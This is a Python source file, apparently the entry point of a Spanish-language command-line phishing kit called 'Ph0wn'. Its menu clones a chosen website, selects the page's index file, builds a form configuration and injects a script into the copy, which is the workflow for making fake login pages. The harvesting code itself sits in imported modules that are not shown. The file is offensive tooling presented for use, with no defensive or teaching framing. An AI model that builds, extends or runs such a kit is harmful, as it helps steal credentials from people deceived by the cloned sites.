from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from create_phishing import clone_page,utils_phishing,create_form
import pyfiglet
import os
import time

console = Console()

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    ascii_banner = pyfiglet.figlet_format("Ph0wn")
    console.print(ascii_banner, style="bold green")
    console.print('Powered by kikedev\n', style="bold green")

def menu():
    console.print(Panel.fit("1. Crear Phishing completo \n2. Seleccionar proyecto existente \n3. Salir", title="Menu", subtitle="Selecciona una opción", style="bold green"))

def create_phising(page,name_folder = None):
    project_path = clone_page.save_page(page,name_folder)
    index_file = utils_phishing.choose_index_item(project_path)
    config = create_form.create_form(os.path.join('www',project_path),index_file)
    create_form.inject_script(config,project_path,index_file)
    
def main():
    while True:
        clear_screen()
        banner()
        menu()
        opcion = Prompt.ask("\n[bold green]Elige una opción[/bold green]", choices=["1", "2", "3"], default="3")
        
        if opcion == "1":
            page = Prompt.ask("Introduce la página web a clonar")
            choose = Prompt.ask("¿Deseas algún nombre concreto para almacenar la web? (y/N)", default="N")
            
            if choose.lower() == "y":
                choose_name_folder = Prompt.ask("Introduce nombre para la carpeta")
            else:
                choose_name_folder = None

            create_phising(page, choose_name_folder)
            console.print("✅ Página almacenada correctamente\n", style="bold green")
        elif opcion == "2":
            project_path = utils_phishing.choose_web()
            index_file = utils_phishing.choose_index_item(project_path)
            config = create_form.create_form(os.path.join('www',project_path),index_file)
            create_form.inject_script(config,project_path,index_file)
        elif opcion == "3":
            console.print("[bold red]Saliendo...[/bold red]")
            break
        
        console.print("\n[dim]Pulsa ENTER para continuar...[/dim]")
        input()

if __name__ == "__main__":
    main()
